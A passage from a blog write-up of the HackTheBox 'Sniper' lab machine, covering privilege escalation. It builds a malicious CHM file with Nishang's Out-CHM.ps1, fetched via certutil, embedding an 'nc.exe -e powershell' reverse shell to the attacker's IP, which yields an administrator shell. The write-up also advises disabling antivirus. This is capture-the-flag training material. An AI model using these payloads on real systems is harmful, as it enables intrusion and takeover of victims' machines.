	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you<span class="s1">'ve prepared the documentation for our new app. Drop it here when you'</span>re <span class="k">done </span>with it.
Regards,
Sniper CEO.
PS C:<span class="se">\D</span>ocs&gt; 
</pre></table></code></div></div><ul><li>instruction.chm</li></ul><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\users\chris\Downloads</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">
</span><span class="nf">ls</span><span class="w">
    </span><span class="nf">Directory:</span><span class="w"> </span><span class="nx">C:\users\chris\Downloads</span><span class="w">
</span><span class="nf">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                  
</span><span class="nf">----</span><span class="w">                </span><span class="nf">-------------</span><span class="w">         </span><span class="nf">------</span><span class="w"> </span><span class="nf">----</span><span class="w">                                                                  
</span><span class="nt">-a</span><span class="nf">----</span><span class="w">        </span><span class="nx">4/11/2019</span><span class="w">   </span><span class="nx">8:36</span><span class="w"> </span><span class="nx">AM</span><span class="w">          </span><span class="nx">10462</span><span class="w"> </span><span class="nx">instructions.chm</span><span class="w">                                                      
</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\users\chris\Downloads</span><span class="err">&gt;</span><span class="w"> 
</span></pre></table></code></div></div><p>So according to my belief the boss is complaining about the chris skills of php and he also ask <code class="language-plaintext highlighter-rouge">chris</code> to make a documentation and upload it to <code class="language-plaintext highlighter-rouge">/Docs</code> dir but chris is not prepared yet , and he saved his file to Downloads dir…</p><p>So we will create a <code class="language-plaintext highlighter-rouge">malicious</code> <code class="language-plaintext highlighter-rouge">chm</code> file and will upload it to the /Docs dir so the Boss will execute it As <code class="language-plaintext highlighter-rouge">administrator</code></p><p>We are going to use <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank">Nishang OUT-CHM.ps1</a> for creating the malicious chm file</p><p>And the script needs Html Help Workshop to execute successfully</p><p>Download and install <a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank">htmlhelp.exe</a> on your Windows machine</p><h2 id="creating-a-malicious-chm-file">Creating a malicious CHM file</h2><p>Now its time to fire up your <code class="language-plaintext highlighter-rouge">windows</code> machine and install <code class="language-plaintext highlighter-rouge">html help</code> on your machine. So lets create a <code class="language-plaintext highlighter-rouge">malicious chm file</code> with the payload of nc.exe reverse shell</p><p><code class="language-plaintext highlighter-rouge">NOTE -- Disable your av and virus protection</code></p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\prashant\Desktop</span><span class="err">&gt;</span><span class="nx">certutil</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\prashant\Desktop</span><span class="err">&gt;</span><span class="nx">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\out.chm.ps1</span><span class="p">;</span><span class="nf">out-chm</span><span class="w"> </span><span class="nt">-Payload</span><span class="w"> </span><span class="s2">"C:\tmp\nc.exe -e powershell 10.10.15.32 8888"</span><span class="w"> </span><span class="nt">-HHCPath</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\HTML Help Workshop"</span><span class="w">
</span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">HTML</span><span class="w"> </span><span class="nx">Help</span><span class="w"> </span><span class="nx">Compiler</span><span class="w"> </span><span class="nx">4.74.8702</span><span class="w">
</span><span class="nf">Compiling</span><span class="w"> </span><span class="nx">c:\Users\prashant\Desktop\doc.chm</span><span class="w">
</span><span class="nf">Compile</span><span class="w"> </span><span class="nx">time:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">minutes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">seconds</span><span class="w">
</span><span class="mi">2</span><span class="w">       </span><span class="nf">Topics</span><span class="w">
</span><span class="mi">4</span><span class="w">       </span><span class="nf">Local</span><span class="w"> </span><span class="nx">links</span><span class="w">
</span><span class="mi">4</span><span class="w">       </span><span class="nf">Internet</span><span class="w"> </span><span class="nx">links</span><span class="w">
</span><span class="mi">0</span><span class="w">       </span><span class="nf">Graphics</span><span class="w">
</span><span class="nf">Created</span><span class="w"> </span><span class="nx">c:\Users\IEUser\Documents\doc.chm</span><span class="p">,</span><span class="w"> </span><span class="nx">13</span><span class="p">,</span><span class="nx">422</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
</span></pre></table></code></div></div><p>And we got a <code class="language-plaintext highlighter-rouge">doc.chm</code> file generated and i shared the doc.chm to my linux machine</p><p>And then transferred it to the sniper machine</p><p>And move the doc.chm to <code class="language-plaintext highlighter-rouge">/Docs</code> Dir so the boss can execute it</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Docs</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cp</span><span class="w"> </span><span class="nx">/tmp/doc.chm</span><span class="w"> </span><span class="nx">/Docs</span><span class="w">
</span></pre></table></code></div></div><p>As soon as we move the doc.chm to the /Docs we get a reverse shell on nc listener</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="err">┌─</span><span class="p">[</span><span class="err">✗</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="kt">root</span><span class="err">@</span><span class="kt">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="nf">/home/prashant</span><span class="p">]</span><span class="w">
</span><span class="err">└──╼</span><span class="w"> </span><span class="c">#nc -nlvp 8888</span><span class="w">
</span><span class="kt">listening</span><span class="w"> </span><span class="kt">on</span><span class="w"> </span><span class="p">[</span><span class="kt">any</span><span class="p">]</span><span class="w"> </span><span class="mi">8888</span><span class="w"> </span><span class="o">...</span><span class="w">
</span><span class="kt">connect</span><span class="w"> </span><span class="kt">to</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10.15.32</span><span class="p">]</span><span class="w"> </span><span class="kt">from</span><span class="w"> </span><span class="p">(</span><span class="kt">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10.10.151</span><span class="p">]</span><span class="w"> </span><span class="mi">49959</span><span class="w">
</span><span class="kt">Windows</span><span class="w"> </span><span class="kt">PowerShell</span><span class="w"> 
</span><span class="kt">Copyright</span><span class="w"> </span><span class="p">(</span><span class="nf">C</span><span class="p">)</span><span class="w"> </span><span class="kt">Microsoft</span><span class="w"> </span><span class="no">Corporation.</span><span class="w"> </span><span class="kt">All</span><span class="w"> </span><span class="kt">rights</span><span class="w"> </span><span class="no">reserved.</span><span class="w">
</span><span class="kt">PS</span><span class="w"> </span><span class="nf">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span><span class="kt">whoami</span><span class="w">
</span><span class="kt">sniper</span><span class="nf">\administrator</span><span class="w">
</span><span class="kt">PS</span><span class="w"> </span><span class="nf">C:\Windows\system32</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h1 id="got-roottxt">Got root.txt</h1><p>Without wasting any time i grabbed the root.txt</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
</span><span class="nf">cat</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
</span><span class="mi">5624</span><span class="nf">-------------------------c15</span><span class="w">
</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> on <a href="https://www.buymeacoffee.com/0xprashant" target="_blank">BuymeaCoffee</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote></div><div class="post-tail-wrapper text-muted"><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="top" title="Wed, Jun 17, 2020, 3:03 AM -0400"> Jun 17, 2020 <i class="unloaded">2020-06-17T07:03:57+00:00</i> </span></div><div class="pt-3"> <a href="/tags/rfi/" class="post-tag no-text-decoration" >Rfi</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/tags/chm/" class="post-tag no-text-decoration" >Chm</a> <a href="/tags/nishang/" class="post-tag no-text-decoration" >nishang</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> <span class="license-text ml-1 mr-1"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 <i class="fab fa-creative-commons"></i> <i class="fab fa-creative-commons-by"></i> </a> </span></div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label ml-1 mr-1">Share</span> <span class="share-icon"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Sniper writeup - 0xPrashant&url=http://0xprashant.github.io/posts/htb-sniper/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter mr-1"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Sniper writeup - 0xPrashant&u=http://0xprashant.github.io/posts/htb-sniper/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square mr-1"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Sniper writeup - 0xPrashant&url=http://0xprashant.github.io/posts/htb-sniper/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram mr-1"></i> </a> <i class="fa-fw fas fa-link mr-1 small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 topbar-down"><div class="access"><div id="access-lastmod" class="post mb-4"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-remote/">Hackthebox Remote writeup</a></li><li><a href="/posts/htb-bug/">HackTheBox was vulnerable to reverse tabnapping</a></li><li><a href="/posts/htb-nest/">Hackthebox Nest writeup</a></li><li><a href="/posts/hackthebox-sauna/">Hackthebox Sauna writeup</a></li><li><a href="/posts/htb-book/">Hackthebox Book writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/sudo-vulnerability/">sudo vulnerability</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/rpcclient/">rpcclient</a> <a class="post-tag" href="/tags/nishang/">nishang</a> <a class="post-tag" href="/tags/mimikatz/">mimikatz</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-remote/" class="btn btn-outline-primary"><p>Hackthebox Remote writeup</p></a> <a href="/posts/htb-cascade/" class="btn btn-outline-primary"><p>Hackthebox Cascade writeup</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-4"><p class="font-italic text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://0xprashant.github.io/posts/htb-sniper/'; this.page.identifier = '/posts/htb-sniper/'; } }; $.disqusLoader('#disqus', options); </script> <!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-json/"><div class="card-body"> <span class="timeago small"> Feb 21, 2020 <i class="unloaded">2020-02-21T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Json writeup</h3><div class="text-muted small"><p>information Json is a medium level machine and its a very interesting machine and straightforward too …. Lets start with the nmap scan And these are the ports that are opened………………………… 1 2 3 4 5...</p></div></div></a></div><div class="card"> <a href="/posts/htb-nest/"><div class="card-body"> <span class="timeago small"> Feb 21, 2020 <i class="unloaded">2020-02-21T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Nest writeup</h3><div class="text-muted small"><p>information Column Details Name Nest IP 10.10.10.178 Points 20 Os Windows ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-quick/"><div class="card-body"> <span class="timeago small"> Apr 30, 2020 <i class="unloaded">2020-04-30T00:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Quick writeup</h3><div class="text-muted small"><p>Information@quick:~$ Column Details Name Quick IP 10.10.10.186 Points 40 Os Linux...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const observer = lozad(); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <span data-toggle="tooltip" data-placement="top" title="The blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License.">All rights reserved.</span> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/sudo-vulnerability/">sudo vulnerability</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/rpcclient/">rpcclient</a> <a class="post-tag" href="/tags/nishang/">nishang</a> <a class="post-tag" href="/tags/mimikatz/">mimikatz</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://0xprashant.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
